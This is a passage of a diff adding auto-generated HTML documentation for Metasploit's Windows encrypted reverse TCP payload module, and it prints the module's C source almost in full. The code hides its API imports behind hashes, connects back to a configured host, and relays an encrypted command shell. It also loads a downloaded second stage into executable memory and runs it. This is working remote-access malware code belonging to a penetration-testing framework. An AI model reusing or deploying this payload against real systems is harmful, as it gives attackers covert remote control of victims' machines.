+      chacha_ctx ctx;
+      chacha_keysetup(&amp;ctx, key, 256, 96);
+      chacha_ivsetup(&amp;ctx, nonce);
+
+      do
+      {
+        if(new_key == 0)
+        {
+          char *stream = get_new_key(s);
+          if(stream == NULL)
+          {
+            ExitProcess(term_stat);
+          }
+
+          char *res = chacha_data(stream, 44, &amp;ctx);
+          key = res + 12;
+          nonce = res;
+          new_key = 1;
+
+          chacha_keysetup(&amp;ctx, key, 256, 96);
+          chacha_ivsetup(&amp;ctx, nonce);
+        }
+
+        if(PeekNamedPipe(out, NULL, 0, NULL, &amp;data, NULL) &amp;&amp; data &gt; 0)
+        {
+          if(!ReadFile(out, buf, buf_size-1, &amp;bytes_received, NULL))
+          {
+            ExitProcess(term_stat);
+          }
+          char *cmd = chacha_data(buf, bytes_received, &amp;ctx);
+          SendData(s, cmd, bytes_received, 0);
+          SecureZeroMemory(buf, buf_size);
+          VirtualFree(cmd, bytes_received+1, MEM_RELEASE);
+        }
+        else
+        {
+          DWORD bytes_written = 0;
+
+          bytes_received = RecvData(s, buf, buf_size-1, 0);
+          if(bytes_received &gt; 0)
+          {
+            char *dec_cmd = chacha_data(buf, bytes_received, &amp;ctx);
+            WriteFile(in, dec_cmd, bytes_received, &amp;bytes_written, NULL);
+            SecureZeroMemory(buf, buf_size);
+            VirtualFree(dec_cmd, bytes_received+1, MEM_RELEASE);
+          }
+        }
+        Sleep(100);
+      } while(bytes_received &gt; 0);
+    }
+
+  </span><span class='tstring_end'>^</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="init_winsock-instance_method">
+  
+    #<strong>init_winsock</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+268
+269
+270
+271
+272
+273
+274
+275
+276
+277
+278
+279
+280
+281
+282
+283
+284
+285</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/encrypted_reverse_tcp.rb', line 268</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_init_winsock'>init_winsock</span>
+  <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    void init_winsock()
+    {
+      WSADATA wsadata;
+      FuncWSAStartup WSAInit;
+      UINT term_proc_status = ExitProc();
+      FuncExitProcess ExitProcess = (FuncExitProcess) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ExitProcess</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;kernel32.dll&#39;, &#39;ExitProcess&#39;) -&gt; 0x56a2b5f0
+
+      WSAInit = (FuncWSAStartup) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ws2_32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>WSAStartup</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;ws2_32.dll&#39;, &#39;WSAStartup&#39;) -&gt; 0x006B8029
+      if(WSAInit(MAKEWORD(2, 2), &amp;wsadata))
+      {
+        ExitProcess(term_proc_status);
+      }
+    }
+
+  </span><span class='tstring_end'>^</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="initial_code-instance_method">
+  
+    #<strong>initial_code</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+73
+74
+75
+76
+77
+78
+79
+80
+81
+82
+83</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/encrypted_reverse_tcp.rb', line 73</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_initial_code'>initial_code</span>
+  <span class='id identifier rubyid_src'>src</span> <span class='op'>=</span> <span class='id identifier rubyid_headers'>headers</span>
+  <span class='id identifier rubyid_src'>src</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_align_rsp'>align_rsp</span> <span class='kw'>if</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_arch_to_s'>arch_to_s</span><span class='period'>.</span><span class='id identifier rubyid_eql?'>eql?</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>x64</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_staged?'>staged?</span>
+    <span class='id identifier rubyid_src'>src</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_chacha_func_staged'>chacha_func_staged</span>
+  <span class='kw'>else</span>
+    <span class='id identifier rubyid_src'>src</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_chacha_func'>chacha_func</span>
+  <span class='kw'>end</span>
+  <span class='id identifier rubyid_src'>src</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_exit_proc'>exit_proc</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="initialize-instance_method">
+  
+    #<strong>initialize</strong>(*args)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+21
+22
+23</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/encrypted_reverse_tcp.rb', line 21</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_initialize'>initialize</span><span class='lparen'>(</span><span class='op'>*</span><span class='id identifier rubyid_args'>args</span><span class='rparen'>)</span>
+  <span class='kw'>super</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="sends_hex_uuid?-instance_method">
+  
+    #<strong>sends_hex_uuid?</strong>  &#x21d2; <tt>Boolean</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+
+  </div>
+</div>
+<div class="tags">
+  
+<p class="tag_title">Returns:</p>
+<ul class="return">
+  
+    <li>
+      
+      
+        <span class='type'>(<tt>Boolean</tt>)</span>
+      
+      
+      
+    </li>
+  
+</ul>
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+99
+100
+101</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/encrypted_reverse_tcp.rb', line 99</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_sends_hex_uuid?'>sends_hex_uuid?</span>
+  <span class='kw'>true</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="single_comm-instance_method">
+  
+    #<strong>single_comm</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+520
+521
+522
+523
+524
+525
+526
+527
+528
+529
+530</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/encrypted_reverse_tcp.rb', line 520</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_single_comm'>single_comm</span>
+  <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+      HANDLE *comm_handles = init_process(conn_socket);
+      communicate(*(comm_handles), *(comm_handles+1), conn_socket);
+
+      CloseHandle(*comm_handles);
+      CloseHandle(*(comm_handles + 1));
+      WSACleanup = (FuncWSACleanup) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ws2_32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>WSACleanup</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;ws2_32.dll&#39;, &#39;WSACleanup&#39;) -&gt; 0xf44a6e2b
+    }
+  </span><span class='tstring_end'>^</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="stager_comm-instance_method">
+  
+    #<strong>stager_comm</strong>  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+532
+533
+534
+535
+536
+537
+538
+539
+540
+541
+542
+543
+544
+545
+546
+547
+548
+549
+550
+551
+552
+553
+554
+555
+556
+557
+558
+559
+560
+561
+562
+563
+564
+565
+566
+567
+568
+569
+570
+571
+572
+573
+574</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/encrypted_reverse_tcp.rb', line 532</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_stager_comm'>stager_comm</span>
+  <span class='id identifier rubyid_reg'>reg</span> <span class='op'>=</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_arch_to_s'>arch_to_s</span><span class='period'>.</span><span class='id identifier rubyid_eql?'>eql?</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>x86</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span> <span class='op'>?</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>edi</span><span class='tstring_end'>&#39;</span></span> <span class='op'>:</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>rdi</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_inst'>inst</span> <span class='op'>=</span> <span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_arch_to_s'>arch_to_s</span><span class='period'>.</span><span class='id identifier rubyid_eql?'>eql?</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>x86</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span> <span class='op'>?</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>movl</span><span class='tstring_end'>&#39;</span></span> <span class='op'>:</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>movq</span><span class='tstring_end'>&#39;</span></span>
+
+  <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+      FuncRecv RecvData = (FuncRecv) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ws2_32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>recv</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;ws2_32.dll&#39;, &#39;recv&#39;) -&gt; 0x5fc8d902
+      unsigned int stage_size;
+      int recvd = RecvData(conn_socket, (char *) &amp;stage_size, 4, 0);
+      if(recvd != 4)
+      {
+        ExitProcess(proc_term_status);
+      }
+
+      FuncVirtualAlloc VirtualAlloc = (FuncVirtualAlloc) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>VirtualAlloc</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;kernel32.dll&#39;, &#39;VirtualAlloc&#39;) -&gt; 0xe553a458
+      register char *received = VirtualAlloc(NULL, stage_size + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+      int recv_stg = RecvData(conn_socket, received, stage_size, 0);
+      if(recv_stg != stage_size)
+      {
+        ExitProcess(proc_term_status);
+      }
+
+      char key[] = { </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_format_ds_opt'>format_ds_opt</span><span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ChachaKey</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'> };
+      char nonce[] = { </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_format_ds_opt'>format_ds_opt</span><span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ChachaNonce</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'> };
+
+      chacha_ctx dec_ctx;
+      chacha_keysetup(&amp;dec_ctx, key, 256, 96);
+      chacha_ivsetup(&amp;dec_ctx, nonce);
+      chacha_data(received, stage_size + 1, &amp;dec_ctx);
+
+      // hand the socket to the stage
+      asm(&quot;</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_inst'>inst</span><span class='embexpr_end'>}</span><span class='tstring_content'> %0, %%</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_reg'>reg</span><span class='embexpr_end'>}</span><span class='tstring_content'>&quot;
+          :
+          : &quot;r&quot; (conn_socket)
+          : &quot;%</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_reg'>reg</span><span class='embexpr_end'>}</span><span class='tstring_content'>&quot;
+      );
+
+      // call the stage
+      void (*func)() = (void(*)())received;
+      func();
+    }
+  </span><span class='tstring_end'>^</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="start_comm-instance_method">
+  
+    #<strong>start_comm</strong>(uuid)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+495
+496
+497
+498
+499
+500
+501
+502
+503
+504
+505
+506
+507
+508
+509
+510
+511
+512
+513
+514
+515
+516
+517
+518</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/encrypted_reverse_tcp.rb', line 495</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_start_comm'>start_comm</span><span class='lparen'>(</span><span class='id identifier rubyid_uuid'>uuid</span><span class='rparen'>)</span>
+ <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+     struct addrinfo *info = NULL;
+     info = conn_info_setup(ip, port);
+     FuncSend SendData = (FuncSend) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ws2_32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>send</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;ws2_32.dll&#39;, &#39;send&#39;) -&gt; 0x5f38ebc2
+     WSASock = (FuncWSASocketA) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ws2_32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>WSASocketA</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;ws2_32.dll&#39;, &#39;WSASocketA&#39;) -&gt; 0xe0df0fea
+     conn_socket = WSASock(info-&gt;ai_family, info-&gt;ai_socktype, info-&gt;ai_protocol, NULL, 0, 0);
+
+     if(conn_socket == INVALID_SOCKET)
+     {
+       ExitProcess(proc_term_status);
+     }
+
+     ConnectSock = (FuncConnect) GetProcAddressWithHash(</span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_get_hash'>get_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ws2_32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>connect</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>); // hash(&#39;ws2_32.dll&#39;, &#39;connect&#39;) -&gt; 0x6174a599
+     if(ConnectSock(conn_socket, info-&gt;ai_addr, info-&gt;ai_addrlen) == SOCKET_ERROR)
+     {
+       ExitProcess(proc_term_status);
+     }
+
+     char uuid[] = { </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_format_ds_opt'>format_ds_opt</span><span class='lparen'>(</span><span class='id identifier rubyid_uuid'>uuid</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'> };
+     SendData(conn_socket, uuid, 16, 0);
+
+   </span><span class='tstring_end'>^</span></span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+  </div>
+
+</div>
+
+      <div id="footer">
+  Generated on Wed Mar 31 00:31:54 2021 by
+  <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
+  0.9.26 (ruby-2.7.2).
+</div>
+
+    </div>
+  </body>
+</html>
